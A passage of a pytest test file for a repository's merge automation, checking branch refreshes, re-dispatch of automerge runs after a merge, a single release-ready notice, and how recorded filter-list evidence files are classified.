    git("checkout", "-q", "--detach", "main")
    calls = []
    monkeypatch.setattr(merge, "gh", lambda *a: calls.append(a) or "")
    commit, why = merge.refresh_branch("o/r", DARK, sha["dark"], cwd=repo)
    assert why == "" and commit

    def remote(ref):
        return subprocess.run(["git", "rev-parse", ref], cwd=origin, capture_output=True, text=True).stdout.strip()
    assert remote(DARK) == commit and remote("main") == sha["main"]
    assert [c[2] for c in calls] == ["tests.yml", "security.yml", "arch.yml"]
    assert all(c[:2] == ("workflow", "run") and c[-2:] == ("--ref", DARK) for c in calls)
    # never main, nor a branch that is not the automation's
    for ref in ("main", "fix/1.1.23", "automation/update/"):
        assert merge.refresh_branch("o/r", ref, sha["dark"], cwd=repo) == ("", "not a branch of the automation")
    assert remote("main") == sha["main"]


def test_after_a_merge_the_others_are_judged_again(monkeypatch):
    """(c): the verified merge dispatches automerge.yml for every other open pull request of the
    automation (not a person's, not a stranger's), so the candidates converge one after another; one
    behind main is refreshed instead of merged."""
    sha = "c" * 40
    p = dict(pr(CAND), head={"ref": CAND, "sha": sha, "repo": {"full_name": "o/r"}}, base={"ref": "main",
                                                                                         "sha": "b" * 40})
    others = [dict(pr(ref, repo=repo), number=n, head={"ref": ref, "sha": s * 40, "repo": {"full_name": repo}})
              for n, ref, repo, s in ((108, "automation/update/test-libs", "o/r", "1"),
                                      (109, DARK, "o/r", "2"),
                                      (12, "fix/1.1.23", "o/r", "3"),
                                      (13, DARK, "someone/r", "4"))]
    calls = _main_world(monkeypatch, p, [MAINT, FIX], CAND_FILES, FULL_CHECKS)
    world_api = merge.api
    monkeypatch.setattr(merge, "api", lambda path: [p] + others if path.startswith("repos/o/r/pulls?")
                        else world_api(path))
    assert merge.main(["--repo", "o/r", "--sha", sha]) == 0
    flat = [" ".join(map(str, c[1:])) for c in calls if c[0] == "gh"]
    merged = [i for i, c in enumerate(flat) if c.startswith("api -X PUT repos/o/r/pulls/7/merge")]
    again = [c for c in flat if c.startswith("workflow run automerge.yml")]
    assert len(merged) == 1 and again == ["workflow run automerge.yml --repo o/r --ref main -f sha=" + "1" * 40,
                                          "workflow run automerge.yml --repo o/r --ref main -f sha=" + "2" * 40]
    assert merged[0] < flat.index(again[0])
    # behind main: refreshed (its tests start again), not merged and not left to a person
    calls = _main_world(monkeypatch, p, [MAINT, FIX], CAND_FILES, FULL_CHECKS, behind=1)
    asked = []
    monkeypatch.setattr(merge, "refresh_branch", lambda repo, ref, s: asked.append((ref, s)) or ("e" * 40, ""))
    assert merge.main(["--repo", "o/r", "--sha", sha]) == 0
    flat = [" ".join(map(str, c[1:])) for c in calls if c[0] == "gh"]
    assert asked == [(CAND, sha)] and not any("/merge" in c for c in flat), flat
    assert not any(merge.MARK in c for c in flat) and any(c.startswith("pr comment 7") for c in flat)
    am = (WORKFLOWS / "automerge.yml").read_text()
    assert "fetch-depth: 0" in am and am.count("contents: write") == 1


def test_only_one_release_notice_goes_out(tmp_path):
    """(d): four verified merges into 1.1.23, main's tests after each, release-ready.yml each time:
    one notice (one issue, which GitHub mails), no comment; its list of what went in by itself is kept
    current by an edit (which mails nobody); once published it is closed."""
    import os
    import subprocess
    import sys
    import textwrap
    lines = (WORKFLOWS / "release-ready.yml").read_text().splitlines()
    start = next(i for i, ln in enumerate(lines) if ln.strip() == "- name: Tell the owner, or close the notice")
    run = next(i for i in range(start, len(lines)) if lines[i].strip() == "run: |")
    script = textwrap.dedent("\n".join(lines[run + 1:])) + "\n"
    repo = tmp_path / "main"
    (repo / "ike").mkdir(parents=True)
    (repo / "ike" / "__init__.py").write_text('__version__ = "1.1.23"\n')
    subprocess.run(["git", "init", "-q"], cwd=repo, check=True)
    subprocess.run(["git", "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-q", "--allow-empty", "-m", "x"],
                   cwd=repo, check=True)
    state = tmp_path / "state.json"
    state.write_text(json.dumps({"merged": [], "issues": [], "published": False, "calls": []}))
    fake = tmp_path / "bin" / "gh"
    fake.parent.mkdir()
    fake.write_text("#!%s\n" % sys.executable + textwrap.dedent('''\
        import json, sys, time
        path = %r
        s = json.load(open(path))
        a = sys.argv[1:]
        s["calls"].append(" ".join(a[:3]))
        out, code = "", 0
        def arg(name):
            return a[a.index(name) + 1]
        def opened():
            return [i for i in s["issues"] if i["state"] == "open"]
        if a[:2] == ["release", "view"] and a[2:3] != ["--json"]:
            code = 0 if s["published"] else 1
        elif a[:2] == ["release", "view"]:
            out = "v1.1.22"
        elif a[:2] == ["issue", "list"] and arg("--state") == "open":
            out = str(opened()[0]["number"]) if opened() else ""
        elif a[:2] == ["issue", "list"]:
            out = "0"
        elif a[0] == "api" and "/check-runs" in a[1]:
            out = "success"
        elif a[0] == "api" and "/compare/" in a[1]:
            out = "\\n".join(s["merged"])
        elif a[:2] == ["issue", "create"]:
            s["issues"].append({"number": 50, "state": "open", "body": open(arg("--body-file")).read(),
                                "created": time.strftime("%%Y-%%m-%%dT%%H:%%M:%%SZ", time.gmtime())})
        elif a[:2] == ["issue", "view"] and arg("--json") in ("body", "body,comments"):
            out = opened()[0]["body"]
        elif a[:2] == ["issue", "view"]:
            out = opened()[0]["created"]
        elif a[:2] == ["issue", "edit"]:
            opened()[0]["body"] = open(arg("--body-file")).read()
        elif a[:2] == ["issue", "close"]:
            opened()[0]["state"] = "closed"
        json.dump(s, open(path, "w"))
        if out:
            print(out)
        sys.exit(code)
        ''' % str(state)))
    fake.chmod(0o755)
    env = dict(os.environ, PATH="%s:%s" % (fake.parent, os.environ["PATH"]), GH_TOKEN="x", GH_REPO="o/r",
               OWNER="o", RUNNER_TEMP=str(tmp_path))

    def ready(merged=None, published=False):
        s = json.loads(state.read_text())
        s["merged"] += [merged] if merged else []
        s["published"], s["calls"] = published, []
        state.write_text(json.dumps(s))
        res = subprocess.run(["bash", "-e", "-c", script], cwd=repo, env=env, capture_output=True, text=True,
                             timeout=60)
        assert res.returncode == 0, res.stdout + res.stderr
        return json.loads(state.read_text())
    for n in (107, 108, 109, 110):
        s = ready("Merge pull request #%d: Update (merged by itself: fully verified)" % n)
        assert len(s["issues"]) == 1, s
        assert not any(c.startswith("issue comment") for c in s["calls"]), s["calls"]
    body = s["issues"][0]["body"]
    assert all("#%d: Update" % n in body for n in (107, 108, 109, 110)) and "@o:" in body
    assert "<!-- release-ready: 1.1.23 -->" in body
    s = ready()                                           # the daily run: nothing more
    assert len(s["issues"]) == 1 and not any(c.startswith(("issue comment", "issue edit")) for c in s["calls"])
    s = ready(published=True)                             # signed and published: closed by itself
    assert s["issues"][0]["state"] == "closed" and len(s["issues"]) == 1


def test_the_filter_lists_recorded_evidence_is_not_a_test_change():
    """#111 (2026-11-22): a new file under tests/data/lists-recorded/ is the evidence the workflow
    itself records (tools/filter-lists.py RECORDED_DIR; the AI may not write there), not a test
    changed. A change, removal or rename of one there, or anything else under tests/, still is."""
    lists = load("filter-lists")
    assert merge.RECORDED_DIR == lists.RECORDED_DIR + "/"
    name = lists.RECORDED_DIR + "/2026-11-22-security-protection-dropped-network-filter-error-csp-with-c.txt"
    ref = pr("automation/update/lists-2026-11-22")
    test_file = "a test file changed or removed"

    def why(*extra):
        return decide(ref, files=CODE + list(extra))[1]
    assert test_file not in why(f(name, "@@ -0,0 +1 @@\n+||x^$csp=y", "added"))
    for changed in (f(name, "@@ -1 +1 @@\n-a\n+b"), f(name, "@@ -1 +0,0 @@\n-a", "removed"),
                    dict(f(name, "@@ -1 +1 @@\n-a\n+b", "added"), previous_filename=lists.RECORDED_DIR + "/old.txt"),
                    dict(f(name, "@@ -0,0 +1 @@\n+a", "renamed"), previous_filename=lists.RECORDED_DIR + "/old.txt")):
        assert decide(ref, files=CODE + [changed])[0] == "person" and test_file in why(changed), changed
    # only its own kind of file, directly in that folder
    for other in (lists.RECORDED_DIR + "/conftest.py", lists.RECORDED_DIR + "/sub/x.txt",
                  lists.RECORDED_DIR + "/../test_x.txt", "tests/data/other/x.txt", "tests/test_new.py"):
        assert test_file in why(f(other, "@@ -0,0 +1 @@\n+a", "added")), other
